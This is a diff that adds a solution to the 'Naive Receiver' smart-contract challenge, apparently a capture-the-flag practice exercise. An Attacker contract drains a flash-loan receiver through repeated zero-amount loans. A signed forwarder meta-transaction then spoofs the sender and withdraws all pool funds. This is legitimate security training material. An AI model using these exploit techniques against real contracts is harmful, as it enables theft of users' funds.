@@ -77,8 +77,29 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
+
+        // Crafting malicious metatransactions array
+        bytes[] memory data = new bytes[](1);
+        data[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw,(WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),deployer);
+        // Crafting malicious request 
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool),
+            value: 0,
+            gas: 1e6,
+            nonce: 0,
+            data: abi.encodeCall(Multicall.multicall, (data)),
+            deadline: block.timestamp + 300
+        });
+
         
+        bytes32 requestDigest = utilHashTypedData(forwarder.getDataHash(request), forwarder.domainSeparator());
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestDigest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+        Attacker attacker = new Attacker(forwarder, pool, receiver, weth, request, signature);
+
     }
+
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -95,5 +116,30 @@ contract NaiveReceiverChallenge is Test {
 
         // All funds sent to recovery account
         assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
+    }
+}
+
+contract Attacker {
+constructor (BasicForwarder _forwarder,  NaiveReceiverPool _pool,  FlashLoanReceiver _receiver,  WETH _weth , BasicForwarder.Request memory _request , bytes memory _signature) {
+        // Transfer All funds from flashloan receiver to the pool
+        while (_weth.balanceOf(address(_receiver)) > 0) {
+            _pool.flashLoan(_receiver, address(_weth), 0, "");
+        }
+        // Drain the pool
+        _forwarder.execute(_request, _signature);
+
+    }
+}
+
+function utilHashTypedData(bytes32 structHash, bytes32 domainSeparator) returns (bytes32 digest) {
+    /// @solidity memory-safe-assembly
+    assembly {
+        // Compute the digest.
+        mstore(0x00, 0x1901000000000000) // Store "\x19\x01".
+        mstore(0x1a, domainSeparator) // Store the domain separator.
+        mstore(0x3a, structHash) // Store the struct hash.
+        digest := keccak256(0x18, 0x42)
+        // Restore the part of the free memory slot that was overwritten.
+        mstore(0x3a, 0)
     }
 }
